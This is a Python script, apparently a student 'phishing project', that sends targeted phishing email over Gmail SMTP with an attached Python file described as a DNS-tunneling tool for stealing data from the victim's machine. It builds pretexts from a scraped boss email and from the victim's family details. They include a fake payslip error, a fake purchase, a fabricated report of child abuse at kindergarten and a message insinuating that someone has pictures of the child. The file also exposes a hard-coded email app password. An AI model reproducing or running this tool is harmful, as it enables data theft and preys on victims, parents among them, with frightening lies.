# Project made by: Dana Zorohov 207817529, Nir Meir 313229106

"""
----Phishing Project----
This script is sending a phishing mail to a given target with an attachment file
which steals private information from the victim's machine.
"""

# IMPORTS
import smtplib
import ssl
import sys
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests


"""
---Function search_str:---
Receives path to a file that we want to read, and a word to search in this file.
The file is a text file which demonstrates an mail from the boss of the victim.
We use this function to find the the target's and it's boss's names
and the title of the target (Mr, Ms, Doctor etc...).
With this info we created a mail of our own to send to the victim.
"""


def search_str(file_path, word):
    with open(file_path, 'r') as file:
        # read all content of a file
        content = file.read()
        # split all the lines of the file and store it in array
        arr_content = content.splitlines()
        # check if string "word" present in a line
        for line in arr_content:
            if word in line:
                # 'From' case: we need the name of the sender (it's the manager)
                if word == 'From':
                    return line[6:]
                # 'To' case: we need the name of the receiver (it's the victim)
                elif word == 'To':
                    return line[4:]
                # 'Dear' case: we need the title of the victim
                elif word == 'Dear':
                    arr = line.split(" ")
                    return arr[1]


"""
---Function Read_file:---
This function receives a downloading url of a text file.
In this text file should be a mail from the manager to our victim.
We download the text file and save in under the name 'sample.txt'.
Then we send it to the function 'search_str' to receive the information we need from this file.
"""


def Read_file(url):
    global name_from
    global name_to
    global subject
    global title
    # receiving the file from the given url and downloading it
    response = requests.get(url)
    # storing the downloaded file under the name 'sample.txt'
    open("sample.txt", "wb").write(response.content)
    # getting the parameters we are interested in from the file
    name_from = search_str('sample.txt', 'From')
    name_to = search_str('sample.txt', 'To')
    title = search_str('sample.txt', 'Dear')


"""
---Function 'main':---
Here we are sending the mail to to victim.
"""


def main():
    # defining smtp server, port and our sending mail
    smtp_server = "smtp.gmail.com"
    port = 587  # For starttls
    sender_email = "mcherbert255@gmail.com"

    password = input("password: ")
    # App_password: bjhrovvmmepzvhkz

    # getting the parameters from the command line
    userName = sys.argv[1]  # what comes before the '@'
    mail_service = sys.argv[2]  # gmail, yahoo, walla...
    title = sys.argv[3]  # ms\mr\mrs\doctor\professor...
    job = sys.argv[4]  # the profession of the target.
    status = sys.argv[5]  # single\married...
    has_kids = sys.argv[6]  # yes\no

    # assembling the victim's mail address
    target_mail = userName + '@' + mail_service

    # creating the mail we want to send
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = target_mail

    # The message options when the victim has no kids
    if has_kids == "no":

        # check if we received url at the command line
        if len(sys.argv) == 8:

            # extracting the url from the arguments and sending it to the
            # function 'Read_file' to receive the name of the victim, name of it's
            # boss, and the title of the victim.
            url = sys.argv[7]
            Read_file(url)

            # selecting the subject of the mail
            msg['Subject'] = "Payslip Problem Awareness"

            # NO KIDS & URL CONDITION:
            text = f"Hey {title} {name_to}, \n The financial department had a bug in their systems.\
                                              \n It caused some payslips problems to several employees. \
                                              \n Please check that your payslip is correct for this month. \
                                              \n The payslip file attached to this mail. \
                                              \n Thanks, \
                                              \n {name_from}. "

        else:
            # selecting the subject of the mail
            msg['Subject'] = "Payment confirmed!"

            # NO KIDS & NO URL CONDITION:
            text = f"Hey {title} {userName}, \n Thank you for buying our products, your order is confirmed.\
                                                   \n Order number: 47338859. \
                                                   \n Total Amount:5199$ \
                                                   \n Payment method: Credit card \
                                                   \n Your order Summary attached to this mail. \
                                                   \n This is an automatically generated email, please do not replay. "

    # The message options when the victim has kids
    elif has_kids == "yes":

        # creating an array to store the kids ages
        kids = []

        # looping through all the ages at the arguments
        for x in range(7, len(sys.argv)):

            # checking if we have an age at sys.argv[x]
            if isinstance(x, int):

                # if does, we add it to the kids ages array
                kids.append(sys.argv[x])

        # taking the smallest age from the array
        min_kid = int(min(kids))

        # the place of the last argument at the arguments line
        len_final = len(sys.argv)-1

        # check if we received url at the command line
        if isinstance(sys.argv[len_final], str):

            # extracting the url from the arguments and sending it to the
            # function 'Read_file' to receive the name of the victim, name of it's
            # boss, and the title of the victim.
            url = sys.argv[len_final]
            Read_file(url)

            # selecting the subject of the mail
            msg['Subject'] = "Payslip Problem Awareness"

            # KIDS & URL CONDITION:
            text = f"Hey {title} {name_to}, \n The financial department had a bug in their systems.\
                                                         \n It caused some payslips problems to several employees. \
                                                         \n Please check that your payslip is correct for this month. \
                                                         \n The payslip file attached to this mail. \
                                                         \n Thanks, \
                                                         \n {name_from}. "

        else:

            # two different messages according to the youngest child of the victim
            if min_kid < 6:

                # selecting the subject of the mail
                msg['Subject'] = "A Concerned parent"

                # KIDS & YOUNGEST < 6 & NO URL CONDITION:
                text = f"Hey {title} {userName}, \n Our kids are together in the kindergarten .\
                                                       \n I've noticed for the last few weeks that my child returned home with signs of beating all over her body. \
                                                       \n Therefore I've hired a private investigator to find out how it happens.\
                                                       \n He found out that it was the Kindergarten Teacher. \
                                                       \n Your child was abused by her too. \
                                                       \n I have added the investigator's findings to this mail. \
                                                       \n I don't know what we can do about it, maybe you will."

            if min_kid > 5:

                # selecting the subject of the mail
                msg['Subject'] = "Your kid is pretty"

                # KIDS & YOUNGEST > 5 & NO URL CONDITION:
                text = f"Hey {title} {userName}, \n Your child was contacting me through the internet and we talked for the last few months.\
                                                       \n During our conversations I've got a lot of pictures of you child that were sent willingly. \
                                                       \n All the pictures are attached to this mail.\
                                                       \n I like the way your kid looks. :) "

    # creating message body
    body = MIMEText(text,)
    msg.attach(body)

    # The DNS tunneling file to steal info from the target
    attachmentPath = "attachment.py"

    # adding the file to the mail
    try:
        with open(attachmentPath, "rb") as attachment:
            p = MIMEApplication(attachment.read(), _subtype="txt")
            p.add_header('Content-Disposition', "attachment; filename= %s" % attachmentPath.split("\\")[-1])
            msg.attach(p)
    except Exception as e:
        print(str(e))

    msg_full = msg.as_string()

    # Create a secure SSL context
    context = ssl.create_default_context()

    # Try to log in to server and send email
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()  # Can be omitted
        server.starttls(context=context)  # Secure the connection
        server.ehlo()  # Can be omitted
        server.login(sender_email, password)

        # message = 'Subject: {}\n\n{}'.format(SUBJECT, text)
        server.sendmail(sender_email, target_mail, msg_full)

    except Exception as e:
        print("there is error")
        # Print any error messages to stdout
        print(e)
    finally:
        print("mail send success")
        server.quit()


if __name__ == '__main__':
    main()


